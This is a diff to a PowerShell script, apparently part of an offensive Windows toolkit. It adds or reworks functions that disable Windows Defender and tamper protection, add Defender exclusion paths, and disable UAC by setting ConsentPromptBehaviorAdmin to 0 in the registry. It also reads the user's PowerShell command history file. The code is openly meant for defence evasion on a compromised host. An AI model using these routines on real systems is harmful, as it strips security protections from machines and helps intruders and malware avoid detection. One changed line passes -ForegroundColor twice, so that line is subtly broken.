@@ -124,7 +124,7 @@ function Get-History{
     Get-Content -Path C:\Users\$Username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 }
 
-function Close-Defender{
+function Disable-Defender{
 
     $DefenderEnabled = $true
 
@@ -138,10 +138,6 @@ function Close-Defender{
             Write-Host "Windows defender is inactive, no further action required!" -ForegroundColor Black -Backgroundcolor Red
             break
         }
-
-        # Disable UAC
-        Write-Host "Disabling UAC..." -ForegroundColor Black -Backgroundcolor Red 
-        cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
 
         # Check if tamper protection is enabled
         $Defendertamper = (Get-MpComputerStatus).IsTamperProtected
@@ -178,16 +174,20 @@ function Close-Defender{
 function Add-DefenderExclusion{
 
     param(
-        [Parameter(Mandatory = $true)] [string[]]$Path
+        [Parameter(Mandatory = $true)] $Path
     )
     # Add exclusion to specified path
-    Add-MpPreference $Path
+    Add-MpPreference -ExclusionPath $Path -ea SilentlyContinue -ErrorVariable ExclusionPathError
 
-    # Print 
-    Write-Host "Defender exclusion path added @ $Path." -ForegroundColor Black -Backgroundcolor Green
+    if($ExclusionPathError){
+        Write-Host "Unable to add an exclusion path! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
+    }
+    else{
+        Write-Host "Defender exclusion path added @ $Path." -ForegroundColor Black -Backgroundcolor Green
+    }
 }
 
-function Close-TamperProtection{
+function Disable-TamperProtection{
     $RegistryPath = "HKLM:SOFTWARE\Microsoft\Windows Defender\Features"
     $Name = "TamperProtection"
     $Value = 0
@@ -200,6 +200,19 @@ function Close-TamperProtection{
         Write-Host "Tamper protection disabled!" -ForegroundColor Black -Backgroundcolor Green
     }
     else{
-        Write-Host "Unable to disable tamper protection!" -ForegroundColor Black -Backgroundcolor Red
+        Write-Host "Unable to disable tamper protection! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
+    }
+}
+
+function Disable-UAC{
+    # Disable UAC
+    Write-Host "Attempting to disable UAC..." -ForegroundColor Black -Backgroundcolor Magenta
+    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -ea SilentlyContinue -ErrorVariable UACError
+    
+    if($UACError){
+        Write-Host "Unable to disable UAC! Insufficient permissions." -ForegroundColor Black -Backgroundcolor Red
+    }
+    else{
+        Write-Host "UAC disabled!" -ForegroundColor Black -ForegroundColor Green
     }
 }
